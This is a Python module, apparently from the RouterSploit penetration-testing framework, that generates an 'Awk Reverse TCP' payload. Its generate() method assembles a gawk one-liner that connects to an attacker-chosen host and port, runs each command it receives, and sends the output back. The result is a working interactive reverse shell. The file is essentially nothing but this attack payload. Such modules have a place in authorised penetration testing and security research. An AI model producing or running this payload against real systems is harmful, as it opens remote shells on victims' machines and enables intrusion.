from routersploit.core.exploit import *
from routersploit.core.exploit.payloads import GenericPayload, ReverseTCPPayloadMixin


class Payload(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Awk Reverse TCP",
        "description": "Creates an interactive tcp reverse shell by using (g)awk.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
    }

    cmd = OptString("awk", "Awk binary")

    def generate(self):
        return (
            self.cmd +
            " 'BEGIN{s=\"/inet/tcp/0/" +
            "{}/{}".format(self.lhost, self.lport) +
            "\";for(;s|&getline c;close(c))" +
            "while(c|getline)print|&s;close(s)};'"
        )
